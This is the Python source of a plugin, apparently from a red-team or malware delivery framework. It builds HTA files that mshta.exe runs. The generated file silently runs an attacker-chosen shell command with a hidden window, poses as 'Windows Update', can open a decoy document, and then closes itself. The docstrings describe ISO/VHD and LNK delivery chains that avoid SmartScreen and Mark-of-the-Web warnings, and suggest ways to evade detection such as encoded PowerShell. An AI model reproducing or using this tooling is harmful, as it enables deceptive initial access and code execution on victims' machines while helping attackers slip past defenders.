"""
Erebus Plugin - HTA (HTML Application) Trigger
Author: Whispergate
Description: Creates .hta trigger files executed by mshta.exe.

Process lineage: Explorer → mshta.exe (signed Windows binary)
No SmartScreen warning on .hta opened from a mounted ISO/VHD.
Supports both VBScript and JScript execution modes.

Ideal delivery chain: ISO/VHD → LNK → mshta.exe target.hta
or directly: ISO/VHD → double-click target.hta → auto-execute
"""

import pathlib
import random
import string
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


class HtaTriggerPlugin(ErebusPlugin):
    """
    Plugin for creating HTA (HTML Application) trigger files.

    HTA files execute via mshta.exe with full trust - no sandbox, no
    ActiveX prompts. Supports VBScript (default) or JScript scripting
    engines. Window is immediately minimised and self-closes after
    payload launch to avoid user-visible UI.
    """

    def __init__(self):
        super().__init__()
        self.REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
        self.AGENT_CODE = self.REPO_ROOT / "agent_code"
        self.PAYLOAD_DIR = self.AGENT_CODE / "payload"

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="hta_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates HTA triggers executed by mshta.exe (Explorer → mshta.exe lineage)",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_hta_trigger": self.create_hta_trigger,
        }

    def validate(self) -> tuple[bool, Optional[str]]:
        return (True, None)

    def on_load(self):
        print("[Plugin] HTA Trigger plugin loaded - Supporting mshta.exe delivery")

    # ================================================================
    # Helpers
    # ================================================================

    @staticmethod
    def _rand_id(n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase, k=n))

    # ================================================================
    # Plugin Functions
    # ================================================================

    def create_hta_trigger(
        self,
        command: str,
        output_filename: str = "setup.hta",
        payload_dir: Optional[pathlib.Path] = None,
        # [MALLEABLE] "vbscript" or "jscript"
        script_language: str = "vbscript",
        # [MALLEABLE] Application name shown in taskbar (briefly)
        app_name: str = "Windows Update",
        # [MALLEABLE] Decoy document to open alongside payload
        decoy_path: str = "",
    ) -> pathlib.Path:
        """
        Create an HTA trigger file that executes a shell command via mshta.exe.

        The HTA window is minimised and immediately closed after execution so
        the victim sees no persistent UI. A decoy file can be opened in parallel
        to provide a plausible pretext for the interaction.

        Args:
            command:         Shell command to execute. Passed to WScript.Shell.Run
                             with window style 0 (hidden) and bWaitOnReturn False.
                             Example: r"cmd.exe /c payload.exe"
            output_filename: Output .hta filename.
            payload_dir:     Directory to write the .hta file into.
            script_language: Scripting engine - "vbscript" (default) or "jscript".
            app_name:        HTA:APPLICATION name attribute shown briefly in taskbar.
            decoy_path:      Full path to a decoy document to open on the victim.
                             Leave empty to skip decoy launch.

        Returns:
            pathlib.Path: Path to the created .hta file.

        ## OPSEC Notes
        Detection Surface:
          - mshta.exe spawning cmd.exe / powershell.exe is well-signatured (LOLBAS)
          - Sysmon Event 1: mshta.exe as ParentImage spawning child process
          - AMSI scans VBScript/JScript inside .hta on Win10+
        Behavioral Indicators:
          - mshta.exe network connections (if command includes download)
          - Short-lived mshta.exe process with no user interaction
        Hardening:
          - [MALLEABLE] Use wscript.exe shell execute instead of WScript.Shell.Run
            to break cmd.exe child lineage
          - [MALLEABLE] Replace command with encoded PowerShell to avoid
            plaintext command in process cmdline
          - Combine with ISO container: no MOTW, no extension warning in Explorer
        Evasion Maturity: Level 2 (Moderate) - mshta.exe is well-known LOLBAS;
          child process lineage is the primary detection vector.
        """
        if payload_dir is None:
            payload_dir = self.PAYLOAD_DIR
        payload_dir = pathlib.Path(payload_dir)
        payload_dir.mkdir(parents=True, exist_ok=True)

        # Escape quotes for safe embedding into script string literals
        safe_command = command.replace('"', chr(34)).replace("'", chr(39))

        decoy_block_vbs = ""
        decoy_block_js = ""
        if decoy_path:
            safe_decoy = decoy_path.replace('"', chr(34))
            decoy_block_vbs = f'\n  oShell.Run Chr(34) & "{safe_decoy}" & Chr(34), 1, False'
            decoy_block_js = f'\n  oShell.Run(\'"{safe_decoy}"\', 1, false);'

        if script_language.lower() == "jscript":
            fn = self._rand_id()
            script_content = f"""<script language="JScript">
function {fn}() {{
  var oShell = new ActiveXObject("WScript.Shell");
  oShell.Run("{safe_command}", 0, false);{decoy_block_js}
  window.close();
}}
{fn}();
</script>"""
        else:
            # VBScript (default)
            script_content = f"""<script language="VBScript">
Sub Window_OnLoad()
  Dim oShell
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "{safe_command}", 0, False{decoy_block_vbs}
  window.close
End Sub
</script>"""

        hta = f"""<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION
  ID="oHTA"
  APPLICATIONNAME="{app_name}"
  BORDER="none"
  BORDERSTYLE="none"
  CAPTION="no"
  CONTEXTMENU="no"
  INNERBORDER="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  NAVIGABLE="no"
  SCROLL="no"
  SELECTION="no"
  SHOWINTASKBAR="no"
  SINGLEINSTANCE="yes"
  SYSMENU="no"
  VERSION="1.0"
  WINDOWSTATE="minimize"
/>
{script_content}
</head>
<body style="margin:0;padding:0;background:#000;"></body>
</html>"""

        output_path = payload_dir / output_filename
        output_path.write_text(hta, encoding="utf-8")
        return output_path


# Module-level instance for plugin auto-discovery
_plugin = HtaTriggerPlugin()


if __name__ == "__main__":
    _metadata = _plugin.get_metadata()
    print(f"[*] {_metadata.name} v{_metadata.version}")
    print(f"[*] Category: {_metadata.category.value}")
    print(f"[*] Description: {_metadata.description}")
    print()
    registered = _plugin.register()
    print(f"[*] Registered functions ({len(registered)}):")
    for fn in sorted(registered):
        print(f"    - {fn}")
    print()
    valid, err = _plugin.validate()
    print("[+] Validation passed" if valid else f"[-] Validation failed: {err}")
